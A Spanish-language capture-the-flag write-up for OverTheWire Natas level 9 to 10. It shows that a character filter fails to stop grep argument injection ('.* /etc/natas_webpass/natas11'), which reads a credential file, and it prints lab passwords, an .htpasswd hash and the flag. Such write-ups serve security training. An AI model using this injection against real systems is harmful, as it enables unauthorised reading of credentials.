#Natas Level 9 → Level 10

Username: natas10

URL:      http://natas10.natas.labs.overthewire.org

##Write Up Iker

Abrimos un navegador y nos conectamos a la página: 

- **URL        : http://natas10.natas.labs.overthewire.org** 
- **Usuario    : natas10**
- **Contraseña : nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu**

La contraseña la hemos sacado del nivel anterior.

Entramos a la página web y observamos que tenemos un **formulario** en el que nos pide que pongamos un **texto** en algún sitio para que lo muestre en el parámetro **output**

```html
For security reasons, we now filter on certain characters

Find words containing: 
Search

Output:
```

Nos comentan que han filtrado algunos caracteres por motivos de seguridad. Nostros probamos a introducir los mismos comandos de la prueba anterior y ver que es lo que pasa

```php
hola; cd ..;ls -l

Output:
Input contains an illegal character!
```

Efectivamente filtra los caracteres especiales. Sabemos que esos caracteres especiales tienen un valor equivalente

Miramos el código fuente y nos encontramos con el siguiente comando:

```php
 if(preg_match('/[;|&]/',$key)) 
````

Esta vez no nos dejarán utilizar esos valores **;** y **&** 

¿Que pasa si ponemos la mascara **Wildcard(.*)**  para que nos muestre cualquier valor con el comando **grep**?

```php
grep -i $key dictionary.txt
grep -i .* dictionary.txt
```
Vemos que nos devulve el contenido de todo el fichero.txt! :smile:

Ahora que sabemos cual es el directorio donde se encuentrans las contraseñas de las pruebas, vamos a leer el contenido de la siguiente prueba:

```bash
/etc/natas_webpass/natas11
```

Preparamos el comando y lo ejecutamos:

```bash
.* /etc/natas_webpass/natas11
```

Nos devuelve mucho texto, entre ellos la contraseña del siguiente nivel

```bash
Output:
.htaccess:AuthType Basic
.htaccess: AuthName "Authentication required"
.htaccess: AuthUserFile /var/www/natas/natas10//.htpasswd
.htaccess: require valid-user
.htpasswd:natas10:$1$lakjx13m$ad/my0s9fiCraK3OrKhGc.
/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
dictionary.txt:African
dictionary.txt:Africans
dictionary.txt:Allah
...
```

**FLAG** = {U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK}
